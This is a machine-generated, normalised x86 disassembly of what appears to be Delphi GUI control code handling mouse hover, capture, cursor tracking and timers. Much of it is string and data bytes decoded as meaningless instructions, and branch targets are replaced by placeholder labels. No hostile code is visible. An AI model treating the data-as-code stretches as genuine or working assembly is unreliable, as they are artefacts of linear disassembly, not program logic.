add [ eax + eax ] dl
call [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] ah
or [ eax ] eax
or [ eax + 0x6f ] cl
je r-xdata
push cs
je r-xdata
inc esi
jb r-xdata
outsd
insb
outsd
je r-xdata
and al 0x42
add [ eax + eax ] dh
push [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xbff0000 ] 0x0
or [ ebp + 0x65 ] ecx
outsb
jne r-xdata
or eax [ eax ]
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0xffffff ] al
adc [ eax ] eax
adc [ edx + 0x74 ] al
outsb
push ebx
insb
outsd
insd
push edx
add [ 0x6d617246 ] dl
outsb
outsb
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e6e4974
jb r-xdata
insd
push esp
outsd
jo r-xdata
or [ edx + 0xd007a86 ] 0x0
adc [ esi + 0x72 ] eax
outsd
insb
outsd
jb r-xdata
and al 0x42
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] ah
or al [ eax ]
or al 0x48
inc esi
outsd
outsb
je r-xdata
and al 0x42
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh 0xd3
out dx eax
add [ 0x466e7442 ] cl
and al 0x42
add [ eax + eax + 0x84ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x7a868a ] al
lldt [ 0x6d617246 ]
inc edx
outsd
je r-xdata
popad
insd
and al 0x42
add [ eax + eax ] bh
inc edx
outsd
je r-xdata
mov al [ esi + 0xf007a ]
adc eax 0x6d617246
je r-xdata
popad
insd
push esp
outsd
jo r-xdata
and al 0x42
add [ eax ] bh
add bh bh
js r-xdata
add [ 0x6f436e4f ] cl
outsd
insb
outsd
jb r-xdata
jne r-xdata
and al 0x42
add [ eax + eax ] ah
jmp [ eax + eax ]
insd
inc ebx
outsd
insb
outsd
jb r-xdata
add [ edx ] dl
add [ 0x656c6553 ] cl
arpl [ ebp + 0x64 ] si
shr edi cl
outsd
insd
push edx
imul esp [ edi + 0x68 ] 0x74754f74
jb r-xdata
inc esi
jb r-xdata
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
or al 0x0
add [ eax + 0x8ba0080 ] 0x0
add bh bh
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebx + 0x78 ] 0xffffff
mov [ ebx + 0x7c ] 0x7a868a
mov [ ebx + 0x80 ] 0xffffff
mov [ ebx + 0x84 ] 0x7a868a
mov edx 0xf
mov eax 0xff00000f
call sub_46b0f8
mov [ ebx + 0x6c ] eax
mov [ ebx + 0x54 ] 0x20000000
mov [ ebx + 0x5c ] 0x20000000
mov [ ebx + 0x68 ] 0xefd3c6
xor eax eax
mov [ ebx + 0x64 ] eax
mov [ ebx + 0x58 ] 0xff000015
mov edx 0xf
mov eax 0xff00000f
call sub_46b0f8
mov [ ebx + 0x60 ] eax
pop ebx
retn
push 0x65676e61
mov eax eax
push ebx
mov ebx eax
mov eax ebx
call sub_47bdc8
mov edx 0xff00000f
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov [ ebx + 0x74 ] 0xff000005
mov [ ebx + 0x38 ] 0xc66931
mov [ ebx + 0x34 ] 0xff00000f
mov [ ebx + 0x48 ] 0xff000011
mov [ ebx + 0x4c ] 0xff000014
mov [ ebx + 0x44 ] 0x808080
mov edx 0xff000008
and al 0x42
add [ eax - 0x44 ] bh
inc edi
add [ eax ] al
dec [ ebx - 0xf7743d ]
push ecx
xor al 0xc7
inc ebx
js r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
arpl [ gs : ebp + 0x64 ] si
and al 0x42
add [ eax + eax ] dh
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebx
and al 0x42
add [ eax ] bh
add [ eax ] al
outsd
insb
outsd
jb r-xdata
insd
jb r-xdata
add [ eax + 0xc66931 ] al
adc [ eax ] al
or eax 0x466e7442
jb r-xdata
add [ eax ] ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or edx [ ebp + 0x6e ]
insb
outsd
jb r-xdata
pop eax
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0015 ] al
outsb
inc ebx
outsd
add [ 0x6d617246 ] dl
and al 0x42
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
sub_46c5b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c5d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c5e0
retn
sub_46cdbf
loopne r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x43 ] si
je r-xdata
add [ eax ] dl
inc esi
add [ eax + 0x46 ] dl
add [ eax ] ch
inc esi
add [ edx ] dl
push esp
inc ebx
jne r-xdata
test al 0x11
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
insb
jae r-xdata
inc eax
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
loope r-xdata
je r-xdata
mov [ 0x5f80044 ] al
dec eax
add [ eax + 0x2c004494 ] al
xchg ebp eax
inc esp
add ah ch
loop r-xdata
add [ eax - 0x61 ] ch
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al ah
add eax 0x8a340048
inc esp
add [ eax - 0x3fffbb77 ] bl
add [ ebx + 0x46ce60c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x31 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 8 + 0x46 ] al
add [ eax - 0x31 ] bl
inc esi
add [ ecx + eax + 0x76140000 ] ch
inc edi
add [ esp + edx + 0x337c0042 ] bh
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ eax + 0x80046e3 ] cl
pop [ eax + eax - 0x58 ]
jecxz r-xdata
mov [ eax + eax - 0x40 ] eax
add ah cl
loopne r-xdata
add al bl
mov al 0x44
jl r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add al ch
int 0x46
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
cld
add [ edx * 4 - 0x1d87ffbc ] cl
inc esi
add [ ebp * 8 + 0x8340047 ] ah
dec eax
add [ eax ] bh
add eax 0x5780048
dec eax
add [ ecx + eax ] cl
dec eax
add al dl
int1
inc edi
add [ eax - 0xe ] ah
inc edi
add al al
inc edi
add [ eax + 0x480046e2 ] ch
add [ eax ] cl
or al 0xff
inc edi
add [ ecx + 0xa40046 ] dl
dec eax
add [ ebx ] al
add ch cl
dec [ ebx ]
mov al 0xeb
call eax
jecxz r-xdata
test [ edi ] sub_47f838
pushfd
cmc
inc edi
add [ eax ] bh
std
inc edi
add [ ebp + eax - 0x6efffb8 ] ah
inc edi
add [ eax - 0x30fffb8 ] ah
add [ ecx + edx * 4 - 0x6fbfffbc ] dl
inc esp
add [ edx + 0x44 ] ah
add al bh
add eax 0x94800048
inc esp
add [ edx * 4 - 0x1d13ffbc ] ch
inc esi
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
lea eax [ eax + eax - 0x2c ]
add al dl
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
outsd
insd
bound ebp [ edi - 0x5c ]
int3
je r-xdata
add [ edx ] al
inc esi
add ah ah
loope r-xdata
adc [ edx ] eax
mov al [ 0xffffffffdc004211 ]
adc al 0x42
insb
jae r-xdata
iretd
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ ebp - 0x7283ffba ] bh
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ esp + ebx * 8 ] al
inc edi
add ah ch
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x46d1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 ] dh
inc esi
add [ esi - 0x2f ] cl
inc esi
add [ edx + eax + 0x73f80000 ] al
inc edi
add [ esp + edx + 0x337c0042 ] bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi + edi * 4 + 0x2f00047 ] ah
cld
je r-xdata
inc eax
add ah bh
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x43 ]
outsd
outsb
je r-xdata
inc ebp
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
movsb [ edi ] [ esi ]
mov edi 0x2f00047
outsd
insb
jo r-xdata
loope r-xdata
inc esi
add [ edi ] al
adc edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
pushad
into
inc esi
add [ eax + 0xb004777 ] dh
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x43 ] si
add [ eax + eax + 0x30048 ] ah
int 0xff
or esi [ eax - 0x1c2f0015 ]
inc esi
add [ eax ] bl

outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x43 ]
outsd
outsb
je r-xdata
add al bl
jecxz r-xdata
in eax 0x46
add ah dh
aam 0x47
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
outsd
insb
sub_46cfee
inc esp
add [ ecx * 4 - 0x1a7bffbf ] dl
inc esi
add ah dh
aam 0x47
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add al bl
jecxz r-xdata
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ ebp - 0x7283ffba ] bh
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ esp + ebx * 8 ] al
inc edi
add ah ch
sub_46d0c4
and ch cl
inc edi
add [ edx + ebx * 8 - 0x261bffb9 ] dl
inc edi
add [ eax ] dh
inc edi
add ah dl
into
inc edi
add [ edx + edx * 8 + 0x47 ] cl
add al bl
rol [ edi ] cl
mov bl dl
inc edi
add [ eax - 0x24 ] cl
inc edi
add al bh
fadd [ edi ]
mov esp 0x540047dd
rol [ edi ] cl
int3
add [ eax ] al
aam 0x47
add [ esp + edx * 8 - 0x3653ffb9 ] cl
inc edi
add [ eax - 0x2b ] cl
inc edi
add [ esi + ebx * 8 ] bh
inc edi
add [ esi + edx * 8 ] bl
inc edi
add ah bh
fild [ edi ]
and dl 0x47
add [ eax - 0x13ffb82a ] bl
fadd [ edi ]
rcr cl 0x1
inc edi
add [ eax + 0x47d9 ] al
into
inc edi
add [ ecx + 0x47 ] al
add [ ebx + ebp * 8 ] dh
inc edi
add [ eax + eax ] al
in eax 0xff
jecxz r-xdata
mov ebp 0xccffccff
in al 0x46
add al bh
in al 0x46
add [ 0xffffffffe4200046 ] ah
inc esi
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
mov [ ebx + ebx * 8 + 0x14e80f74 ] 0x63
je r-xdata
stc
jmp [ edi + ecx * 4 + 0x5 ]
add [ ebx + 0x74db84c6 ] cl
psubsb mm2 [ ebx ]
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
outsd
arpl [ ebx + 0x42 ] bp
popad
jb r-xdata
cld
loop r-xdata
push 0x70046d1
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x3536e8c3 ]
add [ eax ] eax
je r-xdata
mov edx [ ebx + 0x48 ]
inc edx
mov eax ebx
call sub_448740
pop ebx
retn
add [ eax + 0x53000000 ] al
mov ebx eax
mov eax ebx
call sub_480724
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
outsd
arpl [ ebx + 0x42 ] bp
popad
jb r-xdata
adc al 0x54
inc ebx
jne r-xdata
add [ edi ] al
iretd
sub_46d194
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47eb5c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x1ad ] 0x1
mov [ esi + 0x1ae ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46d230
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_480620
mov eax ebx
call sub_48060c
test eax eax
je r-xdata
mov edx 0x6
mov eax ebx
call sub_448764
pop esi
pop ebx
retn
mov eax ebx
call sub_48060c
mov al [ eax + 0x227 ]
sub al 0x2
jae r-xdata
mov edx 0x8
mov eax ebx
call sub_448740
jmp r-xdata
pop esi
pop ebx
retn
sub_46d28c
push esi
mov esi eax
mov eax esi
call sub_44ad10
cmp [ esi + 0x1ad ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x1ab ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
jne r-xdata
mov [ esi + 0x1ab ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_46d2d0
push esi
mov esi eax
mov eax esi
call sub_44ad28
cmp [ esi + 0x1ad ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x1ab ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x1ab ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov [ esi + 0x1aa ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ esi + 0x1ae ] 0x0
sub_46d324
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_47f0c0
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov edx 0x13
call sub_46b0f8
push eax
mov eax [ ebx + 0x160 ]
mov esi [ eax + 0x14 ]
mov eax esi
call sub_424a30
pop edx
call sub_42b858
mov edx eax
mov eax esi
call sub_424a0c
sub_46d390
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44b0a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403324
sub_46d3c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44a5ac
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x1a9 ] 0x0
jne r-xdata
mov [ esi + 0x1aa ] 0x1
mov dl 0x2
mov eax esi
call sub_46d74c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46d418
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44a864
cmp [ ebx + 0x1aa ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
cmp [ ebx + 0x1a9 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_46d78c
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x1ae ]
je r-xdata
mov eax ebx
call sub_4489b0
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov dl [ ebp - 0x2 ]
mov eax ebx
call sub_46d74c
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_4489f4
cmp edi eax
jg r-xdata
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_46d4b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44a90c
cmp [ ebx + 0x1aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x1aa ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4489b0
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax esi
call sub_47b0a8
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
call sub_4489f4
cmp edi eax
jle r-xdata
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
mov dl [ ebx + 0x1a9 ]
xor dl 0x1
mov eax ebx
call sub_46d69c
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b0a8
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x1ae ] 0x3
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov [ ebx + 0x1ae ] 0x0
mov [ ebx + 0x1ab ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b0a8
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax ebx
call sub_46d78c
mov eax ebx
mov si 0xffeb
call sub_403324
mov al [ ebx + 0x1ae ]
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b0a8
cmp [ eax + 0x69 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_46d5f8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_47f940
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
add esp 0x10
pop ebx
retn
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424864
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax ebx
pop edx
mov ebx [ eax ]
call [ ebx + 0xe4 ]
sub_46d660
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47fe20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor edx edx
jmp r-xdata
test esi esi
je r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov dl 0x1
sub_46d69c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
test al al
jne r-xdata
cmp bl [ esi + 0x1a9 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x1a9 ] 0x0
je r-xdata
mov [ esi + 0x1a9 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov [ esi + 0x1ae ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x1ae ] 0x0
jne r-xdata
mov [ esi + 0x1ae ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46d720
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_47ff0c
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax esi
call sub_46d74c
mov [ esi + 0x1ab ] 0x0
pop esi
pop ebx
retn
sub_46d768
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_448540
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
pop esi
pop ebp
retn 0x8
sub_46d78c
push ebx
add esp 0xfffffff8
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop ecx
pop edx
pop ebx
retn
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_447830
cmp ebx eax
sete al
mov [ ebx + 0x1ab ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46d80c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_47f260
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1ae ] 0x2
je r-xdata
inc [ esp + 0x8 ]
inc [ esp + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
sub_46d870
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_46d194
mov [ ebx + 0x1cc ] 0x0
mov [ ebx + 0x1b0 ] 0x2
mov [ ebx + 0x1cd ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4338b0
mov esi eax
mov [ ebx + 0x1b8 ] esi
xor edx edx
mov eax esi
call sub_433a38
push ebx
push sub_46dad8
mov eax esi
call sub_433a58
mov edx 0x2ee
mov eax esi
call sub_433a48
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46d900
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x1b8 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47ec04
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_46d990
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x0
mov al [ esi + 0x1b4 ]
sub al 0x2
jb r-xdata
cmp bl 0x2
sete al
and eax 0x7f
mov edx [ eax * 4 + rw-data ]
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
sub al 0x2
jae r-xdata
mov edi [ esi + 0x1b0 ]
sub eax edi
add edx eax
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov al [ esi + 0x1cd ]
sub al 0x1
jb r-xdata
mov edx [ esi + 0x4c ]
sar edx 0x1
jns r-xdata
sar edi 0x1
jns r-xdata
adc eax 0x0
mov eax [ esi + 0x1b0 ]
push eax
lea ecx [ esp + 0x4 ]
mov dl [ esi + 0x1b4 ]
mov eax [ esi + 0x160 ]
call sub_46b278
jmp r-xdata
je r-xdata
mov edi [ esi + 0x1b0 ]
mov eax edi
sar eax 0x1
jns r-xdata
adc edx 0x0
sub eax edi
cmp bl 0x2
sete cl
and ecx 0x7f
add eax [ ecx * 4 + rw-data ]
mov ecx esp
call sub_417088
adc edi 0x0
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1b0 ]
push eax
lea ecx [ esp + 0x4 ]
mov dl [ esi + 0x1b4 ]
mov eax [ esi + 0x160 ]
call sub_46b430
jmp r-xdata
sub edx eax
cmp bl 0x2
sete al
and eax 0x7f
add edx [ eax * 4 + rw-data ]
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
sub eax edi
xor ecx ecx
mov cl [ esp + 0x8 ]
add eax [ ecx * 4 + rw-data ]
mov ecx esp
call sub_417088
jmp r-xdata
adc eax 0x0
sub_46da9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_46d3c0
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
xor edx edx
mov eax [ esi + 0x1b8 ]
call sub_433a38
sub_46dad8
push ebx
push esi
mov ebx eax
mov dl [ ebx + 0x1cc ]
mov eax [ ebx + 0x1b8 ]
call sub_433a38
cmp [ ebx + 0x1cc ] 0x0
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403324
pop esi
pop ebx
retn
mov edx [ ebx + 0x1c8 ]
mov eax [ ebx + 0x1b8 ]
call sub_433a48
sub_46db6c
push ebx
mov ebx eax
mov eax ebx
call sub_46d5f8
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
pop ebx
retn
sub_46dba0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46d870
lea edx [ esi + 0x80 ]
mov eax [ rw-data ]
call sub_405c78
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
